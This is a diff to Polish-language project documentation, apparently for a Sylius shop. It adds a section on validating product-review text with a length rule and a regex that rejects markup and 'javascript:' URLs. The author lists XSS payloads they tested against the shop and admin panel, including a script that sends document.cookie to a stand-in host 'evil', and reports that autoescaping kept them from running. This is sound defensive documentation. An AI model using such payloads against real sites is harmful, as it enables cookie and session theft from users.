@@ -492,8 +492,30 @@ Badge wylicza `App\Review\PurchaseConfirmation` — sprawdza, czy autor jest wś
 w pamięci per produkt na czas requestu, bo lista opinii pyta o to samo dla każdego wiersza. Twig
 sięga po to przez `oma_review_confirmed_by_purchase(review)`.
 
+### Walidacja treści opinii
+
+Sylius sprawdzał treść opinii **tylko pod kątem pustości** — `comment` ma w jego mapowaniu wyłącznie
+`NotBlank`, żadnej długości. Dlatego przechodziła opinia „test" o treści „test", a razem z nią każdy
+wklejony `<script>`. Dokłada to `config/validator/product_review.yaml`:
+
+| Reguła | Pole | Po co |
+|---|---|---|
+| `Length` min 20, max 1500 | `comment` | krótkie „ok" nikomu nie pomaga, a 1500 znaków wystarczy na opis |
+| `Regex` bez znaczników i `javascript:` | `title`, `comment` | odrzuca `<script>`, `<img onerror=…>`, `<b>` i schemat `javascript:` |
+
+**Sam XSS nie był dziurą** — sprawdziłem: payloady `<script>window.__xss=1</script>`,
+`<img src=x onerror=…>` i `"><script>fetch("http://evil/"+document.cookie)</script>` po zapisaniu
+**nie wykonują się** ani w sklepie, ani w panelu. Twig autoescapuje, więc `window.__xss` zostaje
+`null`, tytuł strony się nie zmienia, a w `innerHTML` nie ma surowego znacznika. Problem był wizerunkowy
+i higieniczny: taka treść wisiała w sklepie jako czytelny tekst. Walidacja odcina ją na wejściu,
+autoescaping zostaje drugą linią obrony.
+
+Reguła celuje w `<` z literą lub `!` oraz w `javascript:`, więc zwykły tekst z „mniejsze niż 50"
+przechodzi — blokowane jest to, co wygląda jak znacznik.
+
 Testy: `e2e/reviews.spec.ts` — gość odbity na logowanie, zalogowany dodaje opinię bez pola e-mail,
-badge pojawia się po opłaconym zamówieniu i nie pojawia się bez zakupu.
+badge pojawia się po opłaconym zamówieniu i nie pojawia się bez zakupu, oraz pięć odrzuconych treści
+(za krótka, skrypt, atrybut zdarzenia, `javascript:` i znacznik w tytule) obok jednej przyjętej.
 
 ## Crony i ich monitoring (Healthchecks)
 
